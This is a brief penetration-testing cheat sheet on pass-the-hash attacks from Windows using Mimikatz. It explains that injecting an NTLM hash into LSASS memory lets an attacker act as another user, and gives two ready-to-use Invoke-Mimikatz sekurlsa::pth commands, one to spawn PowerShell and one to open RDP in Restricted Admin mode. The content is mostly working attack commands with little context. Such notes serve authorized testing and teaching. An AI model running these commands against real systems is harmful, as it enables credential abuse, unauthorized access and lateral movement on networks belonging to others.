# Using Hashes - from Windows - via Mimikatz



## Mimikatz - pass the hash


REQUIRES ADMINISTRATOR PRIVILEGES TO RUN

Mimikatz injects the hash into LSASS memory.
Can now access network resources as that user.

Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'

### RDP


Start mstsc.exe with Mimikatz to RDP in remotely using the hash.
Restricted Admin Mode needs to be enabled on the target server - https://docs.microsoft.com/en-gb/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2

Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:mstsc.exe /restrictedadmin"'
